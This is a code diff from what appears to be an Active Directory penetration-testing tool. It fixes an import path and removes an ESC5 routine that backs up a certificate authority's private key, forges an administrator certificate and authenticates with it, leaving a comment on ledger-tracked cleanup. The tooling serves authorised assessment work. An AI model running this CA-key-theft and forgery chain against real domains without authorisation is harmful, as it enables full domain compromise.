@@ -188,7 +188,15 @@ def _emit_pkinit_compromise(config: EscConfig, nt_hash: str | None) -> None:
         print_exception(exception=exc)
 
     try:
-        from adscan_internal.cli.attack_step_followups import (  # pylint: disable=no-name-in-module
+        # Home of set_last_execution_outcome is ace_step_execution — the same
+        # module backup_operators_escalation and adcs_exploitation import it
+        # from. It was previously imported from attack_step_followups, which
+        # does not define it, so every ESC enrolment printed an ImportError to
+        # the operator and the follow-up outcome was never recorded. The
+        # `no-name-in-module` suppression that came with the wrong path is
+        # deliberately not carried over: it silenced the one check that would
+        # have caught this.
+        from adscan_internal.cli.ace_step_execution import (  # noqa: PLC0415
             set_last_execution_outcome,
         )
 
@@ -360,53 +368,27 @@ async def run_esc15(config: EscConfig) -> EscResult:
     return await _pkinit(config, req2.pfx_path, req2.pfx_password or "", out)
 
 
-async def run_esc5(config: EscConfig) -> EscResult:
-    """ESC5: CA admin → backup CA private key → forge arbitrary cert → PKINIT.
-
-    Requires local admin (or Backup Operators) on the CA host.  Delegates to
-    ca_backup_native (MS-SCMR service-creation chain) then forge_certificate_native.
-    """
-    from adscan_internal.services.adcs.ca_backup import (  # pylint: disable=no-name-in-module
-        CABackupConfig,
-        ca_backup_native,
-        forge_certificate_native,
-    )
-
-    out = _output_dir(config, "esc5")
-    backup_cfg = CABackupConfig(  # pylint: disable=unexpected-keyword-arg,no-value-for-parameter
-        ca_host=config.ca_host,
-        ca_name=config.ca_name,
-        username=config.username,
-        password=config.effective_secret or "",
-        domain=config.auth_domain or config.domain,
-        dc_ip=config.auth_kdc or config.dc_ip,
-    )
-    try:
-        backup = await ca_backup_native(backup_cfg, out)
-    except Exception as exc:
-        telemetry.capture_exception(exc)
-        print_exception(exception=exc)
-        return EscResult(success=False, esc=5, error=str(exc))
-    if not backup.success:
-        return EscResult(success=False, esc=5, error=backup.error or "CA backup failed")
-
-    target_upn = config.target_upn or f"administrator@{config.domain}"
-    try:
-        forge = forge_certificate_native(
-            ca_pfx_path=str(backup.pfx_path),
-            ca_pfx_password=None,
-            upn=target_upn,
-            output_dir=out,
-        )
-    except Exception as exc:
-        telemetry.capture_exception(exc)
-        print_exception(exception=exc)
-        return EscResult(success=False, esc=5, error=f"forge failed: {exc}")
-    if not forge or not forge.pfx_path:
-        return EscResult(success=False, esc=5, error="forge produced no certificate")
-
-    print_success(f"ESC5: forged certificate for {target_upn}")
-    return await _pkinit(config, forge.pfx_path, forge.pfx_password or "", out)
+# ---------------------------------------------------------------------------
+# ESC5 has no enrollment-based executor here. Its exploitation IS "take control
+# of a CA-level object, steal the CA private key, and forge a certificate
+# offline" — the CA-key-theft-and-forge chain implemented by
+# `cli/adcs_exploitation.py::adcs_golden_cert` (native CA backup +
+# `forge_certificate_native`). The attack-path executor dispatches `adcsesc5` to
+# that working implementation directly (`cli/attack_path_execution.py`), so this
+# module carries no separate, drift-prone ESC5 body.
+#
+# `adcsesc5` is `support_kind="supported"` in attack_step_catalog.py: the
+# disclosure gate is closed. The `ca_backup.py` / `cert_forge.py` primitives now
+# register four environment changes in the ledger — the exfiltrated CA private
+# key and the forged certificate (both `manual_required`: a forged certificate
+# has no request ID, is absent from the CA database, and only CA key rotation
+# removes it), and the transient service + temp key file on the CA host (removed
+# and VERIFIED, then `reverted_confirmed`; `manual_required` if a removal could
+# not be confirmed). Disclosure lives in the primitives so BOTH callers — the
+# ESC5 executor dispatch and the live `adcs_golden_cert` — inherit it. Validated
+# in the GOAD lab (`tests/lab/cases/adcs/goad_ca_backup_native.py`). See
+# BACKLOG.md § "ESC5 (CA key theft + offline forge)".
+# ---------------------------------------------------------------------------
 
 
 async def run_esc13(config: EscConfig) -> EscResult:
